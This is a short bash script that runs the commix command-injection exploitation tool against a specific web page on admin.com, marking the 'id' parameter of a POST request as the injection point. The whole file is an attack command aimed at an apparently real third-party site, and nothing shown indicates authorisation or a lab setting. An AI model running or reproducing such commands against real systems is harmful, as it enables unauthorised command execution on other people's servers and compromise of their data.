#!/bin/bash
cd /root/commix/;
python commix.py --url="http://admin.com/servicos_item_pt.php?id=2" --data="id=INJECT_HERE&submit" --cookie="";
